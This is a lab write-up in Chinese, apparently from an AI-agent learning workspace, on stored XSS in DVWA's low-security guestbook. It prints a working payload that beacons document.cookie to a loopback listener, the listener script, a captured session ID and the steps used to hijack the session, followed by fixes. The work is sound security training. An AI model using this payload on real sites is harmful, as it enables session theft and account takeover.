# 漏洞笔记：DVWA 存储型 XSS（low）——真实浏览器执行并劫持 PHPSESSID

- **编号**：B5-XSS-01（Loop 3 B 档，t4）
- **靶场**：Kali VM `dc1` 内 DVWA，`http://192.168.56.101/dvwa/`（宿主侧）/ `http://127.0.0.1/dvwa/`（VM 内）
- **应用**：DVWA，**原有安装**；受测端点 `/dvwa/vulnerabilities/xss_s/`（guestbook 表）
- **定性**：**DVWA 原生漏洞复现**（DVWA 自带的故意漏洞关卡，非自建靶点）
- **危害等级**：**高危（High）**——不止 `alert`：已用真实 Chromium 证明**会话 Cookie 被外带**，且用被窃 ID 成功接管已认证会话
- **CWE/OWASP**：CWE-79（Improper Neutralization of Input During Web Page Generation）；OWASP Top 10 2021 **A03:2021 Injection**
- **复现率**：**≥95%**（low 级 3/3 完整链成功：入库原文 → 浏览器执行 → Cookie 外带 → 被窃 ID 接管）
- **接收端声明**：**只在 Kali 内 `127.0.0.1:8099` 起本地接收端，零公网外带**（队长约束）
- **写端点声明与回滚**：guestbook 属写端点，本轮插入的行已按 `name` 精确删除，行数复原为 3（`loop3-t4-probe15.json` → `guestbook_after`）
- **测试时间**：2026-10-12 22:02–22:17（Asia/Shanghai）
- ⚠️ **档位 cookie 名 = `security`，不是 `security_level`** —— 踩错会落到 `impossible` 档，**`htmlspecialchars` 转义后脚本不执行，直接假阴性**。详见 **§1.2（谁踩谁死级坑）**

---

## 1. 漏洞概述与等级

**危害等级：高危（High）。** 不止 `alert` —— 已用**真实 Chromium 148** 证明完整链：

```
注入 payload → 入库原文 → 渲染页被真实浏览器加载 → JS 执行
→ document.cookie 被读出并外带到接收端 → 用被窃 PHPSESSID 接管已认证会话
```

**判定为已接管的硬证据**：被窃 ID 访问已认证页 **200**，负对照（无该 Cookie）**302** → 跳登录。三轮复现拿到的三个 Cookie 互不相同，证明是各自独立会话而非缓存。

**必须写清的前提条件**：本环境 `session.cookie_httponly = Off`（`php -i` 实测），所以 `document.cookie` 可被 JS 直接读取。**若 `HttpOnly=On`，这条"直接读 Cookie"的路走不通**，只能改走"代替用户发请求"的间接路线（危害仍在，但取证形态不同）。

- **落点**：`/dvwa/vulnerabilities/xss_s/`（`guestbook` 表），DVWA 原生 low 级关卡
- **接收端声明**：仅在 Kali 内 `127.0.0.1:8099`，**零公网外带**
- **回滚**：插入行已按 `name` 精确删除，行数复原为 3

### 1.1 原理（源码级根因）

`low` 级只做 SQL 转义、**不做 HTML 转义**：

```php
// /var/www/html/dvwa/vulnerabilities/xss_s/source/low.php
$message = trim( $_POST[ 'mtxMessage' ] );
$name    = trim( $_POST[ 'txtName' ] );
$message = stripslashes( $message );
$message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message );   // 只防 SQL
$name    = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name );
$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
```

`mysqli_real_escape_string` 只处理 SQL 元字符，对 `<` `>` 完全不动。入库原文即为 payload，渲染页直接输出 → **存储型 XSS**。

会话 Cookie 无 `HttpOnly`（`php -i` 实测 `session.cookie_httponly => Off`；DVWA low 级 `Set-Cookie: PHPSESSID=...; path=/`），因此 `document.cookie` 可被 JS 读取 —— 这是"XSS 能劫持会话"的关键支撑条件。

### 1.2 ⚠️ 谁踩谁死级坑：DVWA 档位 cookie 名是 **`security`**，不是 `security_level`

> **这个坑在 XSS 上特别阴险**：不是"打不出来"，而是**打出来的东西被转义了** —— 你会以为 payload 构造错了，其实档位压根没设对。

**源码证据**（`/var/www/html/dvwa/dvwa/includes/dvwaPage.inc.php`，完整输出见 `loop3-b0-recon7-out.txt`）：

| 行号 | 源码 | 含义 |
|---|---|---|
| **L3** | `$security_levels = array('low', 'medium', 'high', 'impossible');` | 合法档位白名单 |
| **L4** | `if( !isset( $_COOKIE[ 'security' ] ) \|\| !in_array( $_COOKIE[ 'security' ], $security_levels ) ) {` | cookie 不存在或非法 → 进入分支 |
| **L9** | `dvwaSecurityLevelSet( 'impossible' );` | **否则一律落到 `impossible`** |
| **L204** | `if (isset($_COOKIE['security'])) { return $_COOKIE[ 'security' ]; }` | 读取键名 = **`security`** |
| **L226** | `setcookie( 'security', $pSecurityLevel, 0, "/", "", false, $httponly );` | 下发键名 = **`security`** |

**踩坑后果**：

| 你怎么写 | 服务端实际档位 | 你会看到什么 | 真相 |
|---|---|---|---|
| `Cookie: security_level=low` | **`impossible`** | 入库原文被 `htmlspecialchars` 转义，**脚本不执行**，接收端 0 命中 | ❌ **假阴性**：XSS 其实成立 |
| `Cookie: security=low` | `low` | 未转义，脚本执行 | ✅ 真阳性 |

**在浏览器实测里这个坑更隐蔽**：cookie 是在**真实 Chromium** 里设的，**服务端会在响应里下发 `Set-Cookie: security=impossible` 覆盖掉你手写的那个** —— 于是你"明明设了 low，怎么还是不执行"，因为**不是你写的那个值，是服务端刚覆盖回去的值生效**。

**正确用法 + 探针自检**：

```http
Cookie: PHPSESSID=<会话>; security=low
```

```python
# ❌ 错误：键名写错 → 服务端静默落到 impossible 档 → 全面假阴性
cookies = {"PHPSESSID": sid, "security_level": "low"}

# ✅ 正确
cookies = {"PHPSESSID": sid, "security": "low"}

# 自检断言：防止再踩
assert "security_level" not in cookies, "DVWA 档位 cookie 名是 security，不是 security_level"
```

> **对照**：bWAPP 的档位 cookie **才**叫 `security_level`（`0`/`1`/`2`）。**两套靶场两个名字，混用必踩。** 详见 B4-SESSION-01 §1.2。

---

## 2. 可复现 payload

```http
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<会话>; security=low
Content-Type: application/x-www-form-urlencoded

txtName=loop3t4&mtxMessage=%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2F127.0.0.1%3A8099%2Fbeacon%3Ft%3Dloop3t4canary778899%26c%3D%22%2BencodeURIComponent%28document.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
```

解码后的载荷：

```html
<script>new Image().src="http://127.0.0.1:8099/beacon?t=loop3t4canary778899&c="+encodeURIComponent(document.cookie)</script>
```

**唯一性 canary**：`loop3t4canary778899`（8+ 位随机数字）——用于与被窃 Cookie 一起回执，证明这次回调**是我的载荷触发的**，不是页面里自带示例。

接收端（Kali 内，仅回环）：

```bash
python3 -c "
from http.server import BaseHTTPRequestHandler,HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(s):
        open('/tmp/loop3-t4-b5-sink.jsonl','a').write(s.path+'\n')
        s.send_response(200); s.end_headers(); s.wfile.write(b'ok')
HTTPServer(('127.0.0.1',8099),H).serve_forever()"
```

---

## 3. 复现步骤与证据：完整危害证明（不止 alert）

四段链条，每段都有原始证据：

| 阶段 | 动作 | 实测结果 |
|---|---|---|
| ① 入库 | POST 载荷到 `xss_s`（写端点） | `guestbook` 行数 3 → 4（后为 5），**库内为原文** `<script>new Image()...` |
| ② 渲染 | 页面输出 | payload **未转义**出现（`raw_script_tag_in_dom: true`，`escape_check: false`） |
| ③ 执行 | 真实 Chromium 148（selenium）以 `admin` 身份打开该页 | 接收端**新增命中**：`GET /beacon?t=loop3t4canary778899&c=PHPSESSID%3D036dd2f56fcc1ec3e5538e1643d3f51e%3B%20security%3Dlow` |
| ④ 劫持 | 用阶段③拿到的 PHPSESSID 以**陌生客户端**访问 | `GET /dvwa/index.php` → **200**，`title = Welcome :: Damn Vulnerable Web Application (DVWA)` |

**被窃 Cookie 原文（接收端记录）**：

```
Cookie: PHPSESSID=036dd2f56fcc1ec3e5538e1643d3f51e; security=low
```

**执行者身份（接收端记录的 UA）**：

```
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36
```

→ `document.cookie` 在真实浏览器里被读出并外带，出站请求带 `Referer: http://127.0.0.1/`。**这不是 `alert` 级证明，是会话劫持级证明。**

截图（浏览器渲染该页面的实拍）：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-b5-xss.png`（sha256 `ddfb4c791fca03362477e85da8fa966453e01d873b67d5978a91341bb280283c`，95256 字节）。

---

## 4. 分级对照（低/中/高/不可能）

同一载荷打进四个安全档位，各插入独立标记行、浏览器逐档访问（`loop3-t4-probe15.json`）：

| 档位 | 库内存储形态 | 浏览器是否执行并外带 | DOM 里是否有原始标签 |
|---|---|---|---|
| **low** | `<script>new Image()...` **原文** | ✅ **执行，Cookie 外带成功** | `raw_payload_in_dom: true` |
| **medium** | `new Image().src=\\&quot;http://...&quot;+...`（`<script>` 标签被剥、引号被 HTML 实体化） | ❌ 未执行（接收端 0 新增） | false |
| **high** | 同 medium（`<script>` 被剥） | ❌ 未执行 | false |
| **impossible** | 空（`stored_row: ""`） | ❌ 未执行 | false |

> 注：medium/high 的 `all_new_sink_paths` 里出现的 `LO3LVLLOW` 命中是 **low 档遗留回调**，不是该档触发；判定以专属标记 `LO3LVLMEDI`/`LO3LVLHIGH`/`LO3CTRLIMP` 是否命中为准（均为 0）。

---

## 5. 原始证据（绝对路径 + sha256）

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-b5-sink.jsonl` | **接收端原始请求记录**（含完整 Cookie/UA/Referer 头） | `77f9c42b14294625764b83ff37aa65a7014a0b270494950a8f96cc8498838071` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe6.json` | 完整链：接收端自检→入库→浏览器执行→Cookie 外带（含 beacon 解析） | `99b532fa648baf2ec466d901d526c22f45401f5e7cdc85d4fe18fd9390ac83f9` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe7.json` | 用被窃 ID 的劫持证明（200）+ 负对照（302）+ 库表清理核验 | `7a92dcc673326d16ac7d3a021cabc9e309af393d0e2d15a7522afae27b0d8c52` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-b5-xss.png` | 真实 Chromium 渲染该页面的截图 | `ddfb4c791fca03362477e85da8fa966453e01d873b67d5978a91341bb280283c` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe15.json` | 分级对照四档 + 复原后最终状态 | `5160ffd3b337d1de51b049ba18add0ead4186ed358d1658b0f33942b030de253` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe15-sink.jsonl` | 分级对照期间接收端全量记录 | `b8c956579fec1818dc1e81920d2cdc988cc914b78dee336babfec93be903f43d` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe13.json` | 复现率：完整链 3/3 | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe13-sink.jsonl` | 复现率三轮的接收端记录（含三次独立 PHPSESSID） | `f7902c47d8d122fe305137b71db13f2a66e0f0a542b5e856cb1cc3db905b2c52` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-b0-recon3-out.txt` | `xss_s/source/low.php` 与 `xss_s/index.php` 源码全文 | `b6617c10026ba2807d2af1ecd0071414bdccb898c7dfbe471e46bc0a3204aae6` |

**三轮复现的被窃 Cookie（互不相同，证明是各自会话）**：见 `loop3-t4-probe13-sink.jsonl` 中 `LO3RATE0/1/2` 三个标记对应的 `Cookie` 头。

**清理核验**：`DELETE FROM dvwa.guestbook WHERE name IN ('loop3t4','loop3t4rate','loop3t4lvl_*')` → 行数 **3**，与注入前一致（`loop3-t4-probe15.json` → `guestbook_after` / `guestbook_count`）。**注**：表中 `comment_id=2,3` 的旧行 `XSS_S_MARK_66` 属**上一轮遗留**，非本次产物，未删除。

---

## 6. 修复方案

1. **输出编码（根本对策）**：渲染时对用户数据做上下文相关转义，HTML 正文用 `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')`，属性/JS/URL 上下文另用对应编码。DVWA 的 `impossible.php` 即用 `htmlspecialchars`。
2. **存储侧净化不作为唯一防线**：入库时过滤 `<script>` 只挡了这一个标签（medium/high 实测仍可尝试其他向量），必须**输出编码 + CSP** 兜底。
3. **Cookie 加 `HttpOnly`**：本环境 `session.cookie_httponly=Off`，导致 JS 能读 `document.cookie`。置 `On` 后这类"直接读 Cookie"的劫持会失效（但 XSS 仍可代替用户发请求，不能只靠它）。
4. **CSP**：`default-src 'self'; script-src 'self'`，并避免 `unsafe-inline`；DVWA 自带 CSP 关卡可作对照练习。
5. **`SameSite`**：会话 Cookie 加 `SameSite=Lax/Strict`，缩小外带与 CSRF 面。
6. **回归用例**：自动化断言"提交 `<script>` 后渲染页不得出现未转义标签，且 `document.cookie` 不含会话值可外带"。

---

## 7. 参考链接

- DVWA XSS 关卡源码：`/var/www/html/dvwa/vulnerabilities/xss_s/source/low.php`（只读取证，完整输出见 `loop3-b0-recon3-out.txt`）
- **CWE-79** — Improper Neutralization of Input During Web Page Generation（XSS）：https://cwe.mitre.org/data/definitions/79.html
- **CWE-79.3** — Stored Cross-Site Scripting：https://cwe.mitre.org/data/definitions/79.html
- **CWE-1004** — Sensitive Cookie Without 'HttpOnly' Flag（本次的放大器）：https://cwe.mitre.org/data/definitions/1004.html
- **CWE-1021** — Improper Restriction of Rendered UI Layers（Clickjacking，`frame-ancestors` 相关）：https://cwe.mitre.org/data/definitions/1021.html
- OWASP XSS Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP CSP Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- PHP `htmlspecialchars()`：https://www.php.net/manual/en/function.htmlspecialchars.php
- OWASP WSTG-CLNT（客户端测试用例）：https://owasp.org/www-project-web-security-testing-guide/
- 同批次笔记：`security/learning/auth-bypass/B4-SESSION-01-DVWA会话固定与弱会话ID.md`（会话类缺陷，本篇劫持的目标就是会话 ID）

---

## 8. 学习要点

- **`alert` 不算危害证明**。要证明"能拿到什么"：本次证明的是**会话 Cookie 被读出并外带，且被窃 ID 可接管已认证会话**（200 vs 负对照 302）——这才叫完整链。
- **别在服务端"猜"JS 能不能执行**。必须用真实浏览器（本次 Chromium 148 + 匹配版本 chromedriver）打开渲染页，看接收端是否真的收到带 Cookie 的回调。服务端看到的"未转义入库"只是**必要条件**，不是充分条件（CSP/浏览器策略都可能拦截）。
- **接收端只开回环**：外带目标限定 `127.0.0.1`，绝不指向公网，避免把测试数据外流。
- **`HttpOnly=Off` 是放大器**：同样的 XSS，在 `HttpOnly=On` 时无法直接读 `document.cookie`，需要走"代替用户发请求"的间接路线。配置层根因要单独写出来。
- **写端点要能精确回滚**：按插入时写入的 `name` 标记删除，并用行数前后对照核验；旧数据不要误删。

---

## 9. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe6.json','loop3-t4-probe7.json','loop3-t4-probe13.json',
          'loop3-t4-probe15.json','loop3-t4-probe13-sink.jsonl',
          'loop3-t4-probe15-sink.jsonl','loop3-t4-b5-sink.jsonl',
          'loop3-t4-b5-xss.png','loop3-b0-recon3-out.txt')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=9  missing=0`

> 注：本篇的接收端记录文件扩展名是 **`.jsonl`**（jsonlines，一行一条请求），不是 `.json`。引用时**必须写完整文件名**。
